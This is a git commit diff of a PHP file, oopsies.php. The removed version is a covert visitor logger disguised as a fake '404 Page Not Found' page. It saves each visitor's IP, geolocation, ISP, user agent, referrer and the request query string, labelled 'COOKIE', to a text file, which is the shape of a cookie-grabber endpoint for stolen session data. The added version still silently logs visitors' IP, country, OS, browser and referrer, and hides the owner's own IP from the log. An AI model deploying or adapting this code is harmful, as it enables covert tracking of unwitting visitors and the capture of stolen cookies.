a816335a98f1be3b4a6c1fb9b32411b3f439607a
schuylerwalker <68754972+schuylerwalker@users.noreply.github.com>
2020-07-27 01:45:18 -0500

    Update oopsies.php

--- oopsies.php
+++ oopsies.php
@@ -1,20 +1,125 @@
-<!DOCTYPE html><html><head>	<title>Error 404 | Redirecting to correct url</title>	<link rel="icon" type="images/x-icon" href="../images/favicon.ico"></head><body>
-<?phpfunction GetIP() { 	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 		$ip = getenv("HTTP_CLIENT_IP"); 	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 		$ip = getenv("HTTP_X_FORWARDED_FOR"); 	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 		$ip = getenv("REMOTE_ADDR"); 	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 		$ip = $_SERVER['REMOTE_ADDR']; 	else 		$ip = "unknown"; 	return($ip); } function logData() { 	$ipLog = "information.txt"; 
-	$cookie = $_SERVER['QUERY_STRING']; 
-	$register_globals = (bool) ini_get('register_gobals'); 
-	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 	else $ip = GetIP(); 	$rem_port = $_SERVER['REMOTE_PORT']; 	$user_agent = $_SERVER['HTTP_USER_AGENT'];	if (isset( $_SERVER['METHOD'])){		$rqst_method = $_SERVER['METHOD'];	}	else{		$rqst_method = "null";	}	if (isset( $_SERVER['REMOTE_HOST'])) {		$rem_host = $_SERVER['REMOTE_HOST'];	}	else{		$rem_host = "null";	}	if (isset($_SERVER['HTTP_REFERER'])) {		$referer = $_SERVER['HTTP_REFERER'];	}	else	{		$referer = "null";	}	$date=date ("Y/m/d G:i:s"); 	$log=fopen("$ipLog", "a+"); 
+<?php
 
-	// I use this site to get more infos about the IP addy such as city, ISP, location	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
+$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+// Getting OS Name
+function getOS() { 
 
-// Write all data we got in 'information.txt'	fwrite($log, "IP=" . $ip . PHP_EOL);	fwrite($log, "PORT=" . $rem_port . PHP_EOL);	fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);	fwrite($log, "REGION=" . $ip_details->region . PHP_EOL);	fwrite($log, "COUNTRY=" . $ip_details->country . PHP_EOL);	fwrite($log, "LOCATION=" . $ip_details->loc . PHP_EOL);	fwrite($log, "ISP=" . $ip_details->org . PHP_EOL);	fwrite($log, "DATE=" . $date . PHP_EOL);	fwrite($log, "HOST=" . $rem_host . PHP_EOL);	fwrite($log, "UA=" . $user_agent . PHP_EOL);	fwrite($log, "METHOD=" . $rqst_method . PHP_EOL);	fwrite($log, "REF=" . $referer . PHP_EOL);	fwrite($log, "COOKIE=" . $cookie . PHP_EOL . PHP_EOL);
-} logData();?><!-- Diplaying a fake 404 page --> <meta name="viewport" content="width=device-width, initial-scale=1"> <style>
-* { line-height: 1.2; margin: 0; }
-html { color: #888; display: table; font-family: sans-serif; height: 100%; text-align: center; width: 100%; }
-body { display: table-cell; vertical-align: middle; margin: 2em auto; }
-h1 { color: #555; font-size: 2em; font-weight: 400; }
-p { margin: 0 auto; width: 280px; }
-@media only screen and (max-width: 280px) {
-body, p { width: 95%; }
-h1 { font-size: 1.5em; margin: 0 0 0.3em; }
+    global $user_agent;
+
+    $os_platform    =   "Unknown OS Platform";
+
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+							'/kalilinux/i'          =>  'KaliLinux',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile',
+							'/Windows Phone/i'      =>  'Windows Phone'
+                        );
+
+    foreach ($os_array as $regex => $value) { 
+
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+
+    }   
+
+    return $os_platform;
+
 }
-</style></head><body> <h1>Page Not Found</h1> <p>Sorry, but the page you were trying to view does not exist.</p></body></html></body></html> 
+// END of Getting OS
+//
+// Get browser
+function getBrowser() {
+
+    global $user_agent;
+
+    $browser        =   "Unknown Browser";
+
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+							'/Mozilla/i'	=>	'Mozila',
+							'/Mozilla/5.0/i'=>	'Mozila',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+							'/OPR/i'        =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+							'/Bot/i'		=>	'BOT Browser',
+							'/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/mobile/i'     =>  'Handheld Browser'
+                        );
+
+    foreach ($browser_array as $regex => $value) { 
+
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+        }
+
+    }
+
+    return $browser;
+
+}
+// END of getting browser
+
+
+$user_os        =   getOS();
+$user_browser   =   getBrowser();
+// Comming soon part --- Maybe :D 
+//$device_details =   "<strong>Browser: </strong>".$user_browser."<br /><strong>Operating System: </strong>".$user_os."";
+
+// Getting visitor IP address
+$ip = $_SERVER['REMOTE_ADDR'];
+// Getting where visitor come
+$site_refer = $_SERVER['HTTP_REFERER'];
+	// If hes connected directly 
+	if($site_refer == ""){
+		$site = "dirrect connection";
+	}
+  // If he doesn't
+	else{
+		$site = $site_refer;
+	}
+  // Hide ownr's IP address
+	$owner = "HIDE THIS IP ADDRESS";   //Change $owner for something else, cuz someone can simple read that by calling out $owner
+  // change it for $absdfs5sd4 for example and change it down there 
+	$owner_country = "YOUR COUNTRY TAG FOR YOUR IP ↑"; //This u can leave how it is.
+  
+	if($ip == $owner){ //Change it here 
+		$ip = "Owner"; 
+		$country = $owner_country;
+	}
+  //If that wasn't you, it woun't change IP address and it will find info about IP address
+	else{
+		$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
+		$country = $details->country;
+	}
+	// Writing in to txt file
+ $myfile = file_put_contents('ips.txt',date("Y-m-d - H:i:s - "). $country. " ". $ip." | ". $user_os. " | ". $user_browser. " | Come from site :". $site. " | user agent:" .$user_agent .PHP_EOL , FILE_APPEND | LOCK_EX);
+fclose($myfile);
+?>
